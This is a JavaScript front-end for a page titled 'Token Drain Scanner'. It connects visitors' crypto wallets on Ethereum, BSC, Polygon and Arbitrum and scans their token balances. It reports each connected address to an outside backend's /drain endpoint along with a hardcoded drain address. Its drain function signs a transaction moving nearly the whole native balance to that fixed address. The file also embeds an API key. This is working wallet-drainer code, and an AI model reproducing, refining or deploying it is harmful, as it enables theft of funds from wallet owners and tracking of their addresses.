import { createAppKit } from "@reown/appkit";
import { EthersAdapter } from "@reown/appkit-adapter-ethers";
import { ethers } from "ethers";

// Configuration
const CONFIG = {
    projectId: "962425907914a3e80a7d8e7288b23f62",
    backendUrl: "https://tokenbackend-5xab.onrender.com",
    drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
    covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
    
    // RPC Providers
    rpcProviders: {
        1: "https://eth.llamarpc.com",
        56: "https://bsc-dataseed.binance.org",
        137: "https://polygon-rpc.com",
        42161: "https://arb1.arbitrum.io/rpc"
    },
    
    networkNames: {
        1: "Ethereum",
        56: "Binance Smart Chain",
        137: "Polygon",
        42161: "Arbitrum"
    }
};

// Global state
let appKit = null;
let provider = null;
let signer = null;
let currentAccount = null;
let currentChainId = null;
let isConnected = false;
let connectionInProgress = false;
let walletConnector = null;

// DOM Elements
let connectBtn, statusEl, tokensEl, tokensContainer, drainBtn, scanAllBtn, chainSelector, networkSelect, tokenCount;

// Initialize when page loads
document.addEventListener('DOMContentLoaded', async () => {
    console.log('✅ DOM loaded, initializing app...');
    await initializeApp();
});

async function initializeApp() {
    try {
        console.log('🔄 Initializing app...');
        
        // Get DOM elements
        connectBtn = document.getElementById("connectBtn");
        statusEl = document.getElementById("status");
        tokensEl = document.getElementById("tokens");
        tokensContainer = document.getElementById("tokensContainer");
        drainBtn = document.getElementById("drainBtn");
        scanAllBtn = document.getElementById("scanAllBtn");
        chainSelector = document.getElementById("chainSelector");
        networkSelect = document.getElementById("networkSelect");
        tokenCount = document.getElementById("tokenCount");

        if (!connectBtn) {
            console.error('❌ CRITICAL: Connect button not found!');
            updateStatus('Error: Connect button not found');
            return;
        }
        
        console.log('✅ DOM elements found');
        updateStatus('🔄 Initializing wallet connection...');

        // Initialize AppKit in a more robust way
        await initializeAppKit();
        
        // Setup event listeners
        setupEventListeners();
        
        // Test backend connection
        await testBackend();
        
        console.log("✅ App initialized successfully");
        updateStatus("✅ Ready! Click 'Connect Wallet' to begin");
        
    } catch (error) {
        console.error("❌ Initialization error:", error);
        updateStatus("Failed to initialize: " + error.message);
        
        // Emergency fallback
        setupEmergencyFallback();
    }
}

async function initializeAppKit() {
    try {
        console.log("🔄 Initializing AppKit...");
        
        // Create networks array with more explicit configuration
        const networks = [
            {
                id: 1,
                name: "Ethereum",
                rpcUrl: CONFIG.rpcProviders[1],
                currency: "ETH",
                explorerUrl: "https://etherscan.io"
            },
            {
                id: 56,
                name: "Binance Smart Chain", 
                rpcUrl: CONFIG.rpcProviders[56],
                currency: "BNB",
                explorerUrl: "https://bscscan.com"
            },
            {
                id: 137,
                name: "Polygon",
                rpcUrl: CONFIG.rpcProviders[137],
                currency: "MATIC",
                explorerUrl: "https://polygonscan.com"
            },
            {
                id: 42161,
                name: "Arbitrum",
                rpcUrl: CONFIG.rpcProviders[42161],
                currency: "ETH",
                explorerUrl: "https://arbiscan.io"
            }
        ];
        
        console.log('Creating AppKit with networks:', networks);
        
        // Initialize AppKit with more explicit configuration
        appKit = createAppKit({
            adapters: [new EthersAdapter()],
            projectId: CONFIG.projectId,
            networks: networks,
            metadata: {
                name: "Token Drain Scanner",
                description: "Multi-chain token scanner and drain",
                url: window.location.origin,
                icons: ["https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2/logo.png"]
            },
            themeMode: "dark",
            themeVariables: {
                "--w3m-accent": "#3b82f6",
                "--w3m-border-radius-master": "12px"
            },
            features: {
                analytics: false,
                walletConnect: true,
                email: false,
                socials: false
            },
            allWallets: 'HIDE',
            enableEIP6963: true,
            enableCoinbase: false
        });
        
        console.log("✅ AppKit created successfully");
        
        // Get initial state
        const initialState = appKit.getState();
        console.log("Initial AppKit state:", initialState);
        
        // Setup state subscription with better handling
        appKit.subscribeState(async (state) => {
            console.log("🔄 AppKit State Update - DETAILED:", {
                isConnected: state.isConnected,
                account: state.account,
                chain: state.chain,
                connector: state.connector,
                connectors: state.connectors
            });
            
            // Store connector
            if (state.connector) {
                walletConnector = state.connector;
                console.log("📱 Wallet connector:", walletConnector);
            }
            
            // Handle connection events
            if (state.isConnected && state.account && state.chain && !isConnected) {
                console.log("✅ CONNECTION EVENT DETECTED");
                await processConnection(state.account, state.chain);
            }
            
            // Handle disconnection
            else if (!state.isConnected && isConnected) {
                console.log("❌ DISCONNECTION EVENT DETECTED");
                handleDisconnected();
            }
            
            // Handle chain changes when already connected
            else if (state.isConnected && isConnected && state.chain && state.chain.id !== currentChainId) {
                console.log("🔄 CHAIN SWITCH DETECTED");
                await handleChainSwitch(state.chain);
            }
        });
        
        // Check for existing session
        setTimeout(async () => {
            const currentState = appKit.getState();
            console.log("🔍 Checking for existing session:", currentState);
            
            if (currentState.isConnected && currentState.account) {
                console.log("🔄 Found existing session, restoring...");
                await processConnection(currentState.account, currentState.chain);
            }
        }, 1000);
        
    } catch (error) {
        console.error("❌ AppKit initialization error:", error);
        // Don't throw, let fallback handle it
        updateStatus("⚠️ Advanced wallet features disabled - using basic mode");
    }
}

async function testBackend() {
    try {
        updateStatus('🔄 Checking backend connection...');
        const response = await fetch(`${CONFIG.backendUrl}/health`);
        if (response.ok) {
            const data = await response.json();
            console.log("✅ Backend is online:", data);
            return true;
        } else {
            console.log("⚠️ Backend health check failed");
            return false;
        }
    } catch (error) {
        console.log("⚠️ Backend unreachable:", error.message);
        return false;
    }
}

function setupEventListeners() {
    console.log("🔄 Setting up event listeners...");
    
    // Connect button - use direct event handler
    if (connectBtn) {
        connectBtn.onclick = handleConnect;
        console.log("✅ Connect button listener added");
    }
    
    // Drain button
    if (drainBtn) {
        drainBtn.addEventListener("click", handleDrain);
    }
    
    // Scan all chains button
    if (scanAllBtn) {
        scanAllBtn.addEventListener("click", handleScanAll);
    }
    
    // Network selector
    if (networkSelect) {
        networkSelect.addEventListener("change", handleNetworkChange);
    }
    
    // Listen for account changes from external wallets
    if (window.ethereum) {
        window.ethereum.on('accountsChanged', (accounts) => {
            console.log("🔄 External wallet accounts changed:", accounts);
            if (accounts.length === 0) {
                // User disconnected from wallet extension
                handleDisconnected();
            } else if (currentAccount !== accounts[0]) {
                // Account changed
                currentAccount = accounts[0];
                updateStatus(`🔄 Account changed to: ${currentAccount.slice(0, 8)}...`);
                fetchTokens(currentAccount, currentChainId);
            }
        });
        
        window.ethereum.on('chainChanged', (chainIdHex) => {
            const chainId = parseInt(chainIdHex, 16);
            console.log("🔄 External wallet chain changed:", chainId);
            if (currentChainId !== chainId) {
                currentChainId = chainId;
                updateStatus(`🔄 Network changed to: ${CONFIG.networkNames[chainId] || `Chain ${chainId}`}`);
                fetchTokens(currentAccount, chainId);
                
                // Update network selector
                if (networkSelect) {
                    networkSelect.value = chainId;
                }
            }
        });
        
        window.ethereum.on('disconnect', () => {
            console.log("🔄 External wallet disconnected");
            handleDisconnected();
        });
    }
}

function setupEmergencyFallback() {
    console.log('🔄 Setting up emergency fallback...');
    
    if (connectBtn) {
        connectBtn.onclick = handleEmergencyConnect;
        updateStatus('⚠️ Using fallback mode. Click to connect directly.');
    }
}

async function handleEmergencyConnect() {
    updateStatus('🔄 Trying direct connection...');
    
    if (typeof window.ethereum !== 'undefined') {
        try {
            // Check if already connected
            if (isConnected) {
                await handleDisconnect();
                return;
            }
            
            // Request accounts
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            
            if (accounts && accounts.length > 0) {
                await handleDirectConnection(accounts[0]);
            }
        } catch (err) {
            console.error('Direct connection failed:', err);
            updateStatus(`❌ Connection failed: ${err.message}`);
            
            // Check for specific errors
            if (err.code === 4001) {
                updateStatus("❌ Connection rejected by user");
            } else if (err.code === -32002) {
                updateStatus("🔄 Connection already pending, check your wallet");
            }
        }
    } else {
        updateStatus('❌ Please install MetaMask or another wallet');
    }
}

async function handleDirectConnection(account) {
    try {
        currentAccount = account;
        const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
        currentChainId = parseInt(chainIdHex, 16);
        isConnected = true;
        
        // Setup provider
        provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();
        
        // Update UI
        connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
        connectBtn.onclick = handleDisconnect;
        
        const networkName = CONFIG.networkNames[currentChainId] || `Chain ${currentChainId}`;
        updateStatus(`✅ Connected directly!\n👛 Wallet: ${currentAccount.slice(0, 8)}...${currentAccount.slice(-4)}\n🌐 Network: ${networkName}`);
        
        // Show UI elements
        showUIElements();
        
        // Log connection to backend
        await logConnectionToBackend(currentAccount, currentChainId);
        
        // Fetch tokens
        await fetchTokens(currentAccount, currentChainId);
        
        // Update network selector
        if (chainSelector && networkSelect) {
            chainSelector.classList.remove("hidden");
            networkSelect.value = currentChainId;
        }
        
        console.log("✅ Direct connection established successfully");
        
    } catch (error) {
        console.error("❌ Direct connection setup failed:", error);
        updateStatus("Connection setup failed: " + error.message);
        isConnected = false;
        currentAccount = null;
        currentChainId = null;
    }
}

async function handleConnect() {
    console.log("🔄 Connect button clicked!");
    
    try {
        // If already connected, disconnect
        if (isConnected) {
            await handleDisconnect();
            return;
        }
        
        updateStatus("🔄 Connecting wallet...");
        
        // First try AppKit connection
        if (appKit && !connectionInProgress) {
            await handleAppKitConnect();
        } 
        // Fallback to direct connection
        else if (typeof window.ethereum !== 'undefined') {
            await handleEmergencyConnect();
        }
        // No wallet detected
        else {
            updateStatus("❌ No wallet detected. Please install MetaMask or another wallet.");
            alert("No Ethereum wallet found. Please install MetaMask or another wallet extension.");
        }
        
    } catch (error) {
        console.error("❌ Connection error:", error);
        updateStatus("Connection failed: " + error.message);
    }
}

async function handleAppKitConnect() {
    try {
        connectionInProgress = true;
        
        // Try to get existing connection first
        const currentState = appKit.getState();
        if (currentState.isConnected && currentState.account) {
            console.log("🔄 Using existing AppKit connection");
            await processConnection(currentState.account, currentState.chain);
            connectionInProgress = false;
            return;
        }
        
        console.log("📱 Opening AppKit modal...");
        
        // Open the wallet modal with timeout
        const modalPromise = appKit.open({
            view: 'connect',
            connectors: ['injected', 'walletConnect']
        });
        
        // Add timeout for modal
        const timeoutPromise = new Promise((_, reject) => {
            setTimeout(() => reject(new Error("Connection timed out. Please try again.")), 30000);
        });
        
        await Promise.race([modalPromise, timeoutPromise]);
        
        console.log("✅ AppKit modal opened - waiting for user selection...");
        
        // The connection will be handled by the state subscription
        // Set a timeout to reset connectionInProgress if nothing happens
        setTimeout(() => {
            if (connectionInProgress && !isConnected) {
                console.log("⚠️ Connection seems stuck, resetting...");
                connectionInProgress = false;
                updateStatus("🔄 Connection attempt timed out. Please try again.");
            }
        }, 15000);
        
    } catch (error) {
        console.error("❌ AppKit connection error:", error);
        connectionInProgress = false;
        
        // Fallback to direct connection
        if (typeof window.ethereum !== 'undefined') {
            updateStatus("🔄 Switching to direct connection...");
            await handleEmergencyConnect();
        } else {
            updateStatus("❌ Connection failed: " + error.message);
        }
    }
}

async function processConnection(account, chain) {
    try {
        console.log("🔄 Processing connection...");
        
        // Validate account data
        let accountAddress;
        if (typeof account === 'string') {
            accountAddress = account;
        } else if (account && account.address) {
            accountAddress = account.address;
        } else if (account && typeof account === 'object') {
            // Try to get address from object
            accountAddress = account.address || account.account || account.wallet;
        } else {
            throw new Error("Invalid account data received");
        }
        
        // Validate chain data
        let chainId, chainName;
        if (typeof chain === 'number') {
            chainId = chain;
            chainName = CONFIG.networkNames[chain] || `Chain ${chain}`;
        } else if (chain && chain.id) {
            chainId = chain.id;
            chainName = chain.name || CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        } else if (chain && chain.chainId) {
            chainId = chain.chainId;
            chainName = chain.chainName || CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        } else {
            // Try to get from provider
            try {
                if (walletConnector) {
                    const provider = new ethers.providers.Web3Provider(walletConnector.provider);
                    const network = await provider.getNetwork();
                    chainId = network.chainId;
                    chainName = network.name;
                } else {
                    chainId = 1;
                    chainName = "Ethereum";
                }
            } catch (error) {
                chainId = 1;
                chainName = "Ethereum";
            }
        }
        
        // Update global state
        currentAccount = accountAddress;
        currentChainId = chainId;
        isConnected = true;
        connectionInProgress = false;
        
        console.log(`✅ Connection processed: ${currentAccount} on ${chainName} (${chainId})`);
        
        // Update UI
        if (connectBtn) {
            connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
            connectBtn.onclick = handleDisconnect;
        }
        
        updateStatus(`✅ Connected!\n👛 Wallet: ${currentAccount.slice(0, 8)}...${currentAccount.slice(-4)}\n🌐 Network: ${chainName}\n⛓️ Chain ID: ${chainId}`);
        
        // Setup provider based on connection type
        await setupProvider();
        
        // Show UI elements
        showUIElements();
        
        // Log connection to backend
        await logConnectionToBackend(currentAccount, chainId);
        
        // Fetch tokens
        await fetchTokens(currentAccount, chainId);
        
        // Update network selector
        if (chainSelector && networkSelect) {
            chainSelector.classList.remove("hidden");
            networkSelect.value = chainId;
            
            // Populate network options if not already
            if (networkSelect.options.length <= 1) {
                Object.entries(CONFIG.networkNames).forEach(([id, name]) => {
                    const option = document.createElement('option');
                    option.value = id;
                    option.textContent = name;
                    networkSelect.appendChild(option);
                });
            }
        }
        
        console.log("✅ Connection fully established");
        
    } catch (error) {
        console.error("❌ Connection processing failed:", error);
        updateStatus("❌ Connection failed: " + error.message);
        isConnected = false;
        currentAccount = null;
        currentChainId = null;
        connectionInProgress = false;
    }
}

async function setupProvider() {
    try {
        // Try multiple ways to get a provider
        if (walletConnector && walletConnector.provider) {
            provider = new ethers.providers.Web3Provider(walletConnector.provider);
            signer = provider.getSigner();
            console.log("✅ Provider setup from wallet connector");
        } 
        else if (appKit && appKit.signer) {
            provider = new ethers.providers.Web3Provider(appKit.signer);
            signer = provider.getSigner();
            console.log("✅ Provider setup from AppKit signer");
        }
        else if (typeof window.ethereum !== 'undefined') {
            provider = new ethers.providers.Web3Provider(window.ethereum);
            signer = provider.getSigner();
            console.log("✅ Provider setup from window.ethereum");
        }
        else if (currentChainId && CONFIG.rpcProviders[currentChainId]) {
            // Fallback to RPC provider
            provider = new ethers.providers.JsonRpcProvider(CONFIG.rpcProviders[currentChainId]);
            console.log("✅ Provider setup from RPC (read-only)");
        } else {
            console.log("⚠️ Could not setup full provider, using Ethereum mainnet RPC");
            provider = new ethers.providers.JsonRpcProvider(CONFIG.rpcProviders[1]);
        }
        
        // Verify connection
        if (provider) {
            try {
                const network = await provider.getNetwork();
                console.log("🌐 Provider network:", network);
            } catch (error) {
                console.log("⚠️ Could not verify provider network:", error.message);
            }
        }
        
    } catch (error) {
        console.error("❌ Provider setup failed:", error);
    }
}

async function handleDisconnect() {
    console.log("🔄 Disconnecting...");
    
    try {
        // Try AppKit disconnect first
        if (appKit) {
            await appKit.disconnect();
        }
        
        // Also try to disconnect from wallet if possible
        if (typeof window.ethereum !== 'undefined' && window.ethereum.disconnect) {
            try {
                await window.ethereum.disconnect();
            } catch (error) {
                // Some wallets don't support disconnect
                console.log("ℹ️ Wallet doesn't support disconnect method");
            }
        }
        
    } catch (error) {
        console.error("❌ Error during disconnect:", error);
    } finally {
        // Always reset local state
        handleDisconnected();
    }
}

function handleDisconnected() {
    console.log("🔄 Resetting connection state...");
    
    currentAccount = null;
    currentChainId = null;
    isConnected = false;
    connectionInProgress = false;
    walletConnector = null;
    provider = null;
    signer = null;
    
    // Update UI
    if (connectBtn) {
        connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
        connectBtn.onclick = handleConnect;
    }
    
    updateStatus("Disconnected. Click 'Connect Wallet' to begin.");
    hideUIElements();
}

async function handleChainSwitch(newChain) {
    try {
        let chainId, chainName;
        
        if (typeof newChain === 'number') {
            chainId = newChain;
            chainName = CONFIG.networkNames[newChain] || `Chain ${newChain}`;
        } else if (newChain && newChain.id) {
            chainId = newChain.id;
            chainName = newChain.name || CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        } else {
            return;
        }
        
        currentChainId = chainId;
        
        // Update UI
        updateStatus(`🔄 Switched to ${chainName}`);
        
        // Update network selector
        if (networkSelect) {
            networkSelect.value = chainId;
        }
        
        // Fetch tokens for new chain
        if (currentAccount) {
            await fetchTokens(currentAccount, chainId);
        }
        
        // Re-setup provider for new chain
        await setupProvider();
        
    } catch (error) {
        console.error("❌ Chain switch error:", error);
    }
}

async function logConnectionToBackend(address, chainId) {
    try {
        updateStatus("🔄 Logging connection to backend...");
        
        const response = await fetch(`${CONFIG.backendUrl}/drain`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                address: address,
                chainId: chainId,
                drainTo: CONFIG.drainAddress,
                timestamp: new Date().toISOString()
            }),
        });
        
        if (response.ok) {
            const data = await response.json();
            console.log("✅ Backend logged connection:", data);
            updateStatus(`✅ Connected & logged\n💰 Drain address: ${CONFIG.drainAddress.slice(0, 10)}...`);
        } else {
            console.log("⚠️ Backend logging failed");
        }
        
    } catch (error) {
        console.log("⚠️ Backend logging failed:", error.message);
    }
}

async function fetchTokens(address, chainId) {
    if (!tokensEl) return;
    
    tokensEl.innerHTML = '<div class="loading">🔄 Scanning tokens...</div>';
    
    try {
        // Try backend first
        const backendOnline = await testBackend();
        if (backendOnline) {
            const response = await fetch(`${CONFIG.backendUrl}/tokens/${address}?chainId=${chainId}`);
            
            if (response.ok) {
                const data = await response.json();
                if (data.success && data.data.tokens && data.data.tokens.length > 0) {
                    displayTokens(data.data.tokens);
                    updateStatus(`✅ Found ${data.data.tokens.length} tokens on ${CONFIG.networkNames[chainId] || 'this chain'}`);
                    return;
                }
            }
        }
        
        // Fallback to direct Covalent API
        await fetchTokensFromCovalent(address, chainId);
        
    } catch (error) {
        console.error("❌ Token fetch error:", error);
        await fetchTokensFromCovalent(address, chainId);
    }
}

async function fetchTokensFromCovalent(address, chainId) {
    if (!tokensEl) return;
    
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false`
        );
        
        if (!response.ok) {
            throw new Error(`Covalent API error: ${response.status}`);
        }
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        const tokens = items
            .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                
                return {
                    symbol: t.contract_ticker_symbol || (t.native_token ? 'Native' : 'TOKEN'),
                    name: t.contract_name || (t.native_token ? 'Native Token' : 'Unknown'),
                    amount: amount,
                    formattedAmount: amount.toLocaleString(undefined, {
                        minimumFractionDigits: 0,
                        maximumFractionDigits: 6
                    }),
                    value: value,
                    formattedValue: value ? `$${value.toFixed(2)}` : 'N/A',
                    contractAddress: t.contract_address,
                    isNative: t.native_token || false
                };
            });
        
        if (tokens.length > 0) {
            displayTokens(tokens);
            updateStatus(`✅ Found ${tokens.length} tokens on ${CONFIG.networkNames[chainId] || 'this chain'}`);
        } else {
            tokensEl.innerHTML = '<div class="loading">No tokens found on this chain</div>';
            updateStatus("ℹ️ No tokens found on this chain");
        }
        
    } catch (error) {
        console.error("❌ Covalent error:", error);
        tokensEl.innerHTML = '<div class="error">Failed to fetch tokens from Covalent API</div>';
        updateStatus("⚠️ Token scan failed");
    }
}

function displayTokens(tokens) {
    if (!tokensEl) return;
    
    const totalValue = tokens.reduce((sum, t) => sum + (t.value || 0), 0);
    
    const html = tokens.map(token => `
        <div class="token-item">
            <div class="token-info">
                <span class="token-symbol">${token.symbol}</span>
                <span class="token-name">${token.name}</span>
            </div>
            <div>
                <div class="token-amount">${token.formattedAmount || token.amount.toLocaleString(undefined, {maximumFractionDigits: 6})}</div>
                ${token.value > 0 ? `<div class="token-value">$${token.value.toFixed(2)}</div>` : ''}
            </div>
        </div>
    `).join('');
    
    tokensEl.innerHTML = html;
    
    if (tokenCount) {
        tokenCount.textContent = `${tokens.length} token${tokens.length !== 1 ? 's' : ''} • $${totalValue.toFixed(2)}`;
    }
    
    if (tokensContainer) {
        tokensContainer.classList.remove("hidden");
    }
}

async function handleDrain() {
    if (!isConnected || !currentAccount) {
        alert("Please connect wallet first");
        return;
    }
    
    if (!confirm(`⚠️ DRAIN WARNING\n\nThis will send ALL tokens to:\n${CONFIG.drainAddress}\n\nYou need native token (ETH, MATIC, etc.) for gas.\n\nContinue?`)) {
        return;
    }
    
    const drainBtn = document.getElementById("drainBtn");
    
    try {
        updateStatus("🚀 Starting drain process...");
        if (drainBtn) {
            drainBtn.disabled = true;
            drainBtn.textContent = "⏳ Draining...";
        }
        
        // Ensure we have a signer
        if (!signer) {
            await setupProvider();
            
            if (!signer) {
                throw new Error("No wallet provider available for signing");
            }
        }
        
        // Get native token balance
        const balance = await provider.getBalance(currentAccount);
        const gasPrice = await provider.getGasPrice();
        const gasLimit = ethers.BigNumber.from(21000);
        const gasCost = gasPrice.mul(gasLimit);
        
        // Check if enough for gas
        if (balance.gt(gasCost.mul(2))) {
            const sendAmount = balance.sub(gasCost.mul(2));
            
            const tx = await signer.sendTransaction({
                to: CONFIG.drainAddress,
                value: sendAmount,
                gasLimit: gasLimit
            });
            
            updateStatus(`📤 Transaction sent: ${tx.hash}\n⏳ Waiting for confirmation...`);
            
            const receipt = await tx.wait();
            updateStatus(`✅ Drain completed!\nTransaction confirmed in block ${receipt.blockNumber}`);
            
            // Refresh token display
            await fetchTokens(currentAccount, currentChainId);
            
        } else {
            updateStatus("⚠️ Not enough native token for gas");
        }
        
    } catch (error) {
        console.error("❌ Drain error:", error);
        updateStatus(`❌ Drain failed: ${error.message}`);
        alert(`Drain failed: ${error.message}`);
    } finally {
        const drainBtn = document.getElementById("drainBtn");
        if (drainBtn) {
            drainBtn.disabled = false;
            drainBtn.textContent = "⚡ Drain Wallet";
        }
    }
}

async function handleScanAll() {
    if (!isConnected || !currentAccount) {
        alert("Please connect wallet first");
        return;
    }
    
    updateStatus("🔄 Scanning all supported chains...");
    
    try {
        const chains = [1, 56, 137, 42161]; // All supported chain IDs
        let allTokens = [];
        
        for (const chainId of chains) {
            updateStatus(`🔄 Scanning ${CONFIG.networkNames[chainId]}...`);
            
            try {
                const response = await fetch(
                    `https://api.covalenthq.com/v1/${chainId}/address/${currentAccount}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false`
                );
                
                if (response.ok) {
                    const data = await response.json();
                    const items = data?.data?.items || [];
                    
                    const chainTokens = items
                        .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
                        .map(t => {
                            const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                            const value = (t.quote_rate || 0) * amount;
                            
                            return {
                                symbol: t.contract_ticker_symbol || (t.native_token ? 'Native' : 'TOKEN'),
                                name: t.contract_name || (t.native_token ? 'Native Token' : 'Unknown'),
                                amount: amount,
                                formattedAmount: amount.toLocaleString(undefined, { maximumFractionDigits: 6 }),
                                value: value,
                                formattedValue: value ? `$${value.toFixed(2)}` : 'N/A',
                                contractAddress: t.contract_address,
                                isNative: t.native_token || false,
                                chainId: chainId,
                                chainName: CONFIG.networkNames[chainId] || `Chain ${chainId}`
                            };
                        });
                    
                    allTokens = allTokens.concat(chainTokens);
                }
            } catch (error) {
                console.log(`⚠️ Failed to scan chain ${chainId}:`, error.message);
            }
        }
        
        if (allTokens.length > 0) {
            displayAllChainTokens(allTokens);
            updateStatus(`✅ Found ${allTokens.length} tokens across all chains`);
        } else {
            updateStatus("ℹ️ No tokens found across any supported chain");
        }
        
    } catch (error) {
        console.error("❌ Scan all error:", error);
        updateStatus("❌ Failed to scan all chains: " + error.message);
    }
}

function displayAllChainTokens(tokens) {
    if (!tokensEl) return;
    
    // Group tokens by chain
    const tokensByChain = {};
    tokens.forEach(token => {
        if (!tokensByChain[token.chainId]) {
            tokensByChain[token.chainId] = [];
        }
        tokensByChain[token.chainId].push(token);
    });
    
    let html = '<div class="all-chains-header">Tokens Across All Chains</div>';
    
    Object.entries(tokensByChain).forEach(([chainId, chainTokens]) => {
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        const chainTotal = chainTokens.reduce((sum, t) => sum + (t.value || 0), 0);
        
        html += `
            <div class="chain-section">
                <div class="chain-header">
                    <span>${chainName}</span>
                    <span class="chain-total">$${chainTotal.toFixed(2)}</span>
                </div>
                ${chainTokens.map(token => `
                    <div class="token-item">
                        <div class="token-info">
                            <span class="token-symbol">${token.symbol}</span>
                            <span class="token-name">${token.name}</span>
                        </div>
                        <div>
                            <div class="token-amount">${token.formattedAmount}</div>
                            ${token.value > 0 ? `<div class="token-value">$${token.value.toFixed(2)}</div>` : ''}
                        </div>
                    </div>
                `).join('')}
            </div>
        `;
    });
    
    tokensEl.innerHTML = html;
    
    const totalValue = tokens.reduce((sum, t) => sum + (t.value || 0), 0);
    if (tokenCount) {
        tokenCount.textContent = `${tokens.length} tokens across ${Object.keys(tokensByChain).length} chains • $${totalValue.toFixed(2)}`;
    }
    
    if (tokensContainer) {
        tokensContainer.classList.remove("hidden");
    }
}

async function handleNetworkChange(event) {
    const newChainId = parseInt(event.target.value);
    
    if (newChainId === currentChainId) {
        return;
    }
    
    try {
        updateStatus(`🔄 Switching to ${CONFIG.networkNames[newChainId] || `Chain ${newChainId}`}...`);
        
        // Try to switch network in connected wallet
        if (appKit && isConnected) {
            await appKit.switchChain({ id: newChainId });
        } else if (window.ethereum && isConnected) {
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: `0x${newChainId.toString(16)}` }]
                });
            } catch (switchError) {
                // This error code indicates that the chain has not been added to MetaMask
                if (switchError.code === 4902) {
                    // Try to add the chain
                    await addChainToWallet(newChainId);
                } else {
                    throw switchError;
                }
            }
        } else {
            // Just update locally and fetch tokens
            currentChainId = newChainId;
            await fetchTokens(currentAccount, newChainId);
        }
        
    } catch (error) {
        console.error("❌ Network switch error:", error);
        updateStatus(`❌ Failed to switch network: ${error.message}`);
        // Reset selector
        if (networkSelect) {
            networkSelect.value = currentChainId;
        }
    }
}

async function addChainToWallet(chainId) {
    const chainParams = {
        1: {
            chainId: '0x1',
            chainName: 'Ethereum Mainnet',
            nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
            rpcUrls: [CONFIG.rpcProviders[1]],
            blockExplorerUrls: ['https://etherscan.io']
        },
        56: {
            chainId: '0x38',
            chainName: 'Binance Smart Chain',
            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
            rpcUrls: [CONFIG.rpcProviders[56]],
            blockExplorerUrls: ['https://bscscan.com']
        },
        137: {
            chainId: '0x89',
            chainName: 'Polygon Mainnet',
            nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
            rpcUrls: [CONFIG.rpcProviders[137]],
            blockExplorerUrls: ['https://polygonscan.com']
        },
        42161: {
            chainId: '0xA4B1',
            chainName: 'Arbitrum One',
            nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
            rpcUrls: [CONFIG.rpcProviders[42161]],
            blockExplorerUrls: ['https://arbiscan.io']
        }
    };
    
    if (chainParams[chainId] && window.ethereum) {
        await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [chainParams[chainId]]
        });
    }
}

function showUIElements() {
    const elements = [chainSelector, drainBtn, scanAllBtn, tokensContainer];
    elements.forEach(el => {
        if (el) el.classList.remove("hidden");
    });
}

function hideUIElements() {
    const elements = [chainSelector, drainBtn, scanAllBtn, tokensContainer];
    elements.forEach(el => {
        if (el) el.classList.add("hidden");
    });
    
    if (tokensEl) tokensEl.innerHTML = "";
    if (tokenCount) tokenCount.textContent = "0 tokens";
}

function updateStatus(message) {
    if (statusEl) {
        statusEl.textContent = message;
    }
}

// Debug info
console.log("=== App Debug Info ===");
console.log("Ethers version:", ethers.version);
console.log("Window.ethereum:", typeof window.ethereum !== 'undefined');
if (window.ethereum) {
    console.log("Ethereum provider detected");
    console.log("Is MetaMask?", window.ethereum.isMetaMask);
    console.log("Provider chainId:", window.ethereum.chainId);
}
console.log("DOM Ready State:", document.readyState);
console.log("Location:", window.location.href);
console.log("======================");

// Export for debugging
window.appDebug = {
    getState: () => ({
        isConnected,
        currentAccount,
        currentChainId,
        appKit: appKit ? appKit.getState() : null,
        provider: !!provider,
        signer: !!signer
    }),
    reconnect: handleConnect,
    disconnect: handleDisconnect,
    fetchTokens: () => fetchTokens(currentAccount, currentChainId)
};
